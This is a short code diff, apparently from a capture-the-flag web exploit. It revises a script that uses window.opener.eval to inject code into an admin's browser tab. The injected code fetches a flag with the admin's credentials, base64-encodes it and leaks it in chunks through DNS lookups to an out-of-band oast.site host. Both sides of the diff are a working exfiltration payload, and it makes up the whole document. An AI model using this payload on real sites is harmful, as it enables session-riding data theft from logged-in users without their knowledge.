@@ -2,19 +2,17 @@
 <html><body>
 <script>
 if (window.opener) {
-  // Inject into the admin tab
   window.opener.eval(`
-    fetch('/get_flag', { credentials: 'include' })
-      .then(r => r.text())
-      .then(flag => {
-        // Base64-encode and strip padding
+    fetch('/get_flag',{credentials:'include'})
+      .then(r=>r.text())
+      .then(flag=>{
         let data = btoa(flag).replace(/=/g,'');
-        // Split into ~30-char chunks
         let parts = data.match(/.{1,30}/g);
-        // For each chunk, fire a DNS lookup via an image
-        parts.forEach((part, i) => {
-          new Image().src = 'http://' + part + '.' + i + '.toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/';
-        });
+        // make sure we catch the last short chunk
+        // (parts.length should be 4)
+        for (let i=0;i<parts.length;i++){
+          new Image().src = 'http://'+parts[i]+'.'+i+'.toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/';
+        }
       });
   `);
 }
